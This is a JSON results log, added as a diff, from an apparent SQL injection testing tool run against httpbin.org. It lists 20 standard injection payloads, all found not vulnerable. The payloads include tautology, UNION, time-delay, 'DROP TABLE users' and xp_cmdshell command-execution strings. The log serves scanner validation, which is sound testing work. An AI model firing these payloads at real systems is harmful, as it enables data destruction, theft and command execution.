@@ -1,0 +1,188 @@
+{
+  "tool": "sql_injection_test",
+  "timestamp": "20260710_115910",
+  "session_id": "test_validation_20260710_115837",
+  "inputs": {
+    "url": "https://httpbin.org/get",
+    "param": "id",
+    "method": "GET",
+    "db_type": "generic"
+  },
+  "outputs": {
+    "status": "success",
+    "target": "https://httpbin.org/get",
+    "parameter": "id",
+    "method": "GET",
+    "payloads_tested": 20,
+    "vulnerable": false,
+    "summary": {
+      "total_tested": 20,
+      "vulnerable_payloads": 0,
+      "error_based": 0,
+      "data_leaked": 0
+    },
+    "vulnerable_payloads": [],
+    "all_results": [
+      {
+        "payload": "' OR '1'='1",
+        "response_length": 155,
+        "error_based": false,
+        "data_leaked": false,
+        "vulnerable": false,
+        "confidence": "low"
+      },
+      {
+        "payload": "' OR '1'='1'--",
+        "response_length": 155,
+        "error_based": false,
+        "data_leaked": false,
+        "vulnerable": false,
+        "confidence": "low"
+      },
+      {
+        "payload": "' OR '1'='1'/*",
+        "response_length": 155,
+        "error_based": false,
+        "data_leaked": false,
+        "vulnerable": false,
+        "confidence": "low"
+      },
+      {
+        "payload": "' OR 1=1--",
+        "response_length": 155,
+        "error_based": false,
+        "data_leaked": false,
+        "vulnerable": false,
+        "confidence": "low"
+      },
+      {
+        "payload": "' OR 1=1#",
+        "response_length": 155,
+        "error_based": false,
+        "data_leaked": false,
+        "vulnerable": false,
+        "confidence": "low"
+      },
+      {
+        "payload": "admin'--",
+        "response_length": 155,
+        "error_based": false,
+        "data_leaked": false,
+        "vulnerable": false,
+        "confidence": "low"
+      },
+      {
+        "payload": "' UNION SELECT NULL--",
+        "response_length": 155,
+        "error_based": false,
+        "data_leaked": false,
+        "vulnerable": false,
+        "confidence": "low"
+      },
+      {
+        "payload": "' UNION SELECT NULL,NULL--",
+        "response_length": 155,
+        "error_based": false,
+        "data_leaked": false,
+        "vulnerable": false,
+        "confidence": "low"
+      },
+      {
+        "payload": "' UNION SELECT NULL,NULL,NULL--",
+        "response_length": 155,
+        "error_based": false,
+        "data_leaked": false,
+        "vulnerable": false,
+        "confidence": "low"
+      },
+      {
+        "payload": "1' ORDER BY 1--",
+        "response_length": 155,
+        "error_based": false,
+        "data_leaked": false,
+        "vulnerable": false,
+        "confidence": "low"
+      },
+      {
+        "payload": "1' ORDER BY 10--",
+        "response_length": 155,
+        "error_based": false,
+        "data_leaked": false,
+        "vulnerable": false,
+        "confidence": "low"
+      },
+      {
+        "payload": "' AND 1=1--",
+        "response_length": 155,
+        "error_based": false,
+        "data_leaked": false,
+        "vulnerable": false,
+        "confidence": "low"
+      },
+      {
+        "payload": "' AND 1=2--",
+        "response_length": 155,
+        "error_based": false,
+        "data_leaked": false,
+        "vulnerable": false,
+        "confidence": "low"
+      },
+      {
+        "payload": "'; DROP TABLE users--",
+        "response_length": 155,
+        "error_based": false,
+        "data_leaked": false,
+        "vulnerable": false,
+        "confidence": "low"
+      },
+      {
+        "payload": "' AND SLEEP(5)--",
+        "response_length": 155,
+        "error_based": false,
+        "data_leaked": false,
+        "vulnerable": false,
+        "confidence": "low"
+      },
+      {
+        "payload": "' AND BENCHMARK(10000000,SHA1('test'))--",
+        "response_length": 358,
+        "error_based": false,
+        "data_leaked": false,
+        "vulnerable": false,
+        "confidence": "low"
+      },
+      {
+        "payload": "' WAITFOR DELAY '0:0:5'--",
+        "response_length": 155,
+        "error_based": false,
+        "data_leaked": false,
+        "vulnerable": false,
+        "confidence": "low"
+      },
+      {
+        "payload": "1; EXEC xp_cmdshell('whoami')--",
+        "response_length": 155,
+        "error_based": false,
+        "data_leaked": false,
+        "vulnerable": false,
+        "confidence": "low"
+      },
+      {
+        "payload": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+        "response_length": 155,
+        "error_based": false,
+        "data_leaked": false,
+        "vulnerable": false,
+        "confidence": "low"
+      },
+      {
+        "payload": "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
+        "response_length": 155,
+        "error_based": false,
+        "data_leaked": false,
+        "vulnerable": false,
+        "confidence": "low"
+      }
+    ]
+  }
+}
